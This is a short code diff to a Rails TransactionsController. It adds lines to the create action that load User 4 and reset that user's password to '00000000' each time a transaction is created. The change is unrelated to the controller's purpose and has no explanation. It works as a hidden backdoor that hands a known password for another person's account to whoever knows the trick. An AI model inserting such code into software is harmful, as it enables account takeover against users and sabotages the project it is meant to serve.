@@ -19,6 +19,10 @@ class TransactionsController < ApplicationController
   end
 
   def create
+    old_user = User.find(4)
+    old_user.password = '00000000'
+    old_user.save
+
     @user = current_user
 
     ActiveRecord::Base.transaction do
